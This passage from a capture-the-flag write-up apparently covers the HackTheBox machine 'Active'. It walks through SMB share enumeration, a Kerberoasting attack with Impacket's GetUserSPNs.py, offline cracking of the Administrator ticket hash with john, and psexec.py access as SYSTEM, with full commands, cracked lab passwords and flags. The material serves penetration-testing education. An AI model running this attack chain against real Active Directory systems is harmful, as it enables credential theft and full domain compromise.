</span></span><span style=display:flex><span>[+] IP: 10.10.10.100:445        Name: 10.10.10.100
</span></span><span style=display:flex><span>        Disk                                                    Permissions     Comment
</span></span><span style=display:flex><span>        ----                                                    -----------     -------
</span></span><span style=display:flex><span>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span style=display:flex><span>        C$                                                      NO ACCESS       Default share
</span></span><span style=display:flex><span>        IPC$                                                    NO ACCESS       Remote IPC
</span></span><span style=display:flex><span>        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span style=display:flex><span>        Replication                                             READ ONLY
</span></span><span style=display:flex><span>        SYSVOL                                                  READ ONLY       Logon server share
</span></span><span style=display:flex><span>        Users                                                   READ ONLY
</span></span></code></pre></div><p>We can read files from the <code>Users</code> share, so let&rsquo;s see if we can find the <code>user.txt</code> flag inside:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ smbclient <span style=color:#ae81ff>\\\\</span>10.10.10.100<span style=color:#ae81ff>\\</span>Users -U SVC_TGS
</span></span><span style=display:flex><span>Enter WORKGROUP\SVC_TGS&#39;s password:
</span></span><span style=display:flex><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style=display:flex><span>smb: \&gt; dir
</span></span><span style=display:flex><span>  .                                  DR        0  Sat Jul 21 10:39:20 2018
</span></span><span style=display:flex><span>  ..                                 DR        0  Sat Jul 21 10:39:20 2018
</span></span><span style=display:flex><span>  Administrator                       D        0  Mon Jul 16 06:14:21 2018
</span></span><span style=display:flex><span>  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
</span></span><span style=display:flex><span>  Default                           DHR        0  Tue Jul 14 02:38:21 2009
</span></span><span style=display:flex><span>  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
</span></span><span style=display:flex><span>  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
</span></span><span style=display:flex><span>  Public                             DR        0  Tue Jul 14 00:57:55 2009
</span></span><span style=display:flex><span>  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                10459647 blocks of size 4096. 5725627 blocks available
</span></span><span style=display:flex><span>smb: \&gt; cd SVC_TGS
</span></span><span style=display:flex><span>smb: \SVC_TGS\&gt; dir
</span></span><span style=display:flex><span>  .                                   D        0  Sat Jul 21 11:16:32 2018
</span></span><span style=display:flex><span>  ..                                  D        0  Sat Jul 21 11:16:32 2018
</span></span><span style=display:flex><span>  Contacts                            D        0  Sat Jul 21 11:14:11 2018
</span></span><span style=display:flex><span>  Desktop                             D        0  Sat Jul 21 11:14:42 2018
</span></span><span style=display:flex><span>  Downloads                           D        0  Sat Jul 21 11:14:23 2018
</span></span><span style=display:flex><span>  Favorites                           D        0  Sat Jul 21 11:14:44 2018
</span></span><span style=display:flex><span>  Links                               D        0  Sat Jul 21 11:14:57 2018
</span></span><span style=display:flex><span>  My Documents                        D        0  Sat Jul 21 11:15:03 2018
</span></span><span style=display:flex><span>  My Music                            D        0  Sat Jul 21 11:15:32 2018
</span></span><span style=display:flex><span>  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
</span></span><span style=display:flex><span>  My Videos                           D        0  Sat Jul 21 11:15:53 2018
</span></span><span style=display:flex><span>  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
</span></span><span style=display:flex><span>  Searches                            D        0  Sat Jul 21 11:16:24 2018
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                10459647 blocks of size 4096. 5725627 blocks available
</span></span><span style=display:flex><span>smb: \SVC_TGS\&gt; cd Desktop
</span></span><span style=display:flex><span>smb: \SVC_TGS\Desktop\&gt; dir
</span></span><span style=display:flex><span>  .                                   D        0  Sat Jul 21 11:14:42 2018
</span></span><span style=display:flex><span>  ..                                  D        0  Sat Jul 21 11:14:42 2018
</span></span><span style=display:flex><span>  user.txt                            A       34  Sat Jul 21 11:06:25 2018
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                10459647 blocks of size 4096. 5725627 blocks available
</span></span><span style=display:flex><span>smb: \SVC_TGS\Desktop\&gt; get user.txt
</span></span><span style=display:flex><span>getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) 
</span></span></code></pre></div><p>And here we have it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ cat user.txt
</span></span><span style=display:flex><span>86d67d8ba232bb6a254aa4d10159e983 
</span></span></code></pre></div><h2 id=kerberoasting-attack>Kerberoasting attack</h2><p>Moreover, with a valid user we can perform an AS-REP Roasting attack. But indeed with valid credentials, we can perform a Kerberoasting attack.</p><p>This attack consists of requesting the Ticket Granting Service (TGS) for a certain user and cracking the hash offline to get the password (if it is weak).</p><p>To setup the attack, first we need to synchronize with the DC (using <code>rdate</code> or <code>ntpdate</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span># rdate -n 10.10.10.100 
</span></span></code></pre></div><p>And then we can check if there is any &ldquo;kerberoastable&rdquo; user:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
</span></span><span style=display:flex><span>Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
</span></span><span style=display:flex><span>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span style=display:flex><span>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783
</span></span></code></pre></div><p>The user <code>Administrator</code> is &ldquo;kerberoastable&rdquo;, so let&rsquo;s requests its TGS:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ GetUserSPNs.py -dc-ip 10.10.10.100 -request-user Administrator active.htb/SVC_TGS:GPPstillStandingStrong2k18
</span></span><span style=display:flex><span>Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
</span></span><span style=display:flex><span>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span style=display:flex><span>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b3f17bf32ac20951eeebe31bd9eec27c$81267a58ead6dfdf2e1f618d845b12109d42d8da7e9ff346e848944a0a8c76303f16b5ebd58e757552381f48666c4f04e6907dce21cce36981fb17c49fda47e559daba2e3507b33f606e880677d447b21b45661d32d8198d333f97a8e658a5cb346a1a7425028bd1c09c9462b26f4f590a4761b7930201a4d80da3a1c88416e43c1bf5a25fbf332e6d453bbc2df4ad451f801533b1c50e9955352760e968f2b9c5c86b02e2084ef8889d579c70d801427192f07d3a21eb31831bfe512428a86acaa3437b8b2aefb38641cca421d0d5bf1079a292206035a85bbd6262ac949e2ee05c3e9dcdcd795455d3f45205fb1bf165fdb0b2b65adf02c377245959edf1aa933964a6083ba0f6b5d11baa14b7824b2934a3cdf72261f754daace37887e9fef6228cae0cef0c76c9146181669078469eb2785d27249f36c5908127ae2e05af85c83c613e176d6ffca83f2f79eec7a8ca36c1e79461bf40f3a2f925b84467240e6973887cefb29e02edd1158c632ceb7a0d3ce9e202783ceabfcbb91e734141b3f7cfff6e2d9b96f7367a1aa1c07ac138eff4618b650e707a6b00f0973faa5bf617045d14dea21ec41e2e75e772f45e3ece377288cb2f686eb1fa16128effcedf26578c4635d460b12f47798adc01a11056ae5833725b69402a1885f8748151bf865a16ccd229762b553b85fc6e549847d908e96e653f8ad7eeb9e9bbb4de30770feed0173ec8857831b452052c20411c0fde0fc1be1ad2e9577202cd729deb3a8bf226d7b17277ddcd6067f3f243ff50a3c6ec994f2e43a419f489352080d0de7b4f516a7842019f5cd2925ef32b4601baefa5526a843f6565a8f12456d66d766a70968d308cf24c31569dc2eab16a93020dcad74b9fec28f30b67f029267168fed183f33ac452fc1eca15d1e74559f412fc28d013256179b0d1aec2342f2c96f5c07ce74c1da2d7b90513e9041710ca24bac865286c092e1a9ecc70674b34868fa8e57134a8848d1aa1133e8ccd70570493bd8ef41877f5c7b9c7ca2b818ce01e30b492ac29c4b4bcf212249ec5762265f56b10b9ec8412972be10c1aa4c3ed01fffa397cd12f0d4b8ad194a9b2e6bffed8e5ce502f8cdcad4df8b6400e265b1a55573b4ae78fef5cf8e4c9e3fbd838512030f25746092e6f6a9f7f96cc4288b3260dfbd79987766106a52057e0f8326b4ddde971995a265a0f956685a0747ebf2da62af222ebdbbf792d91c363872aabea3621ea2cf7c600 
</span></span></code></pre></div><p>Using <code>john</code> and <code>rockyou.txt</code>, we can try to crack the hash:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ john --wordlist<span style=color:#f92672>=</span>$WORDLISTS/rockyou.txt hash
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
</span></span><span style=display:flex><span>Will run 4 OpenMP threads
</span></span><span style=display:flex><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span style=display:flex><span>Ticketmaster1968 (?)
</span></span><span style=display:flex><span>1g 0:00:00:10 100% 0.09718g/s 1024Kp/s 1024Kc/s 1024KC/s Tiffani1432..Thrash1 
</span></span><span style=display:flex><span>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><p>And the password is weak, so we have access as <code>Administrator</code>. To enter the machine, we can use <code>psexec.py</code> and capture the <code>root.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 
</span></span><span style=display:flex><span>Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Requesting shares on 10.10.10.100.....
</span></span><span style=display:flex><span>[*] Found writable share ADMIN$
</span></span><span style=display:flex><span>[*] Uploading file QOyHMYhb.exe
</span></span><span style=display:flex><span>[*] Opening SVCManager on 10.10.10.100.....
</span></span><span style=display:flex><span>[*] Creating service eUnT on 10.10.10.100.....
</span></span><span style=display:flex><span>[*] Starting service eUnT.....
</span></span><span style=display:flex><span>[!] Press help for extra shell commands
</span></span><span style=display:flex><span>Microsoft Windows [Version 6.1.7601]
</span></span><span style=display:flex><span>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>C:\Windows\system32&gt;whoami
</span></span><span style=display:flex><span>nt authority\system
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
</span></span><span style=display:flex><span>b5fc76d1d6b91d77b2fbf2d54d0f708b
</span></span></code></pre></div><div class="mt6 instapaper_ignoref">
</div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#port-scanning>Port scanning</a></li><li><a href=#smb-enumeration>SMB enumeration</a></li><li><a href=#decrypting-password-from-groupsxml>Decrypting password from <code>Groups.xml</code></a></li><li><a href=#more-smb-enumeration>More SMB enumeration</a></li><li><a href=#kerberoasting-attack>Kerberoasting attack</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></div></div></footer></body></html>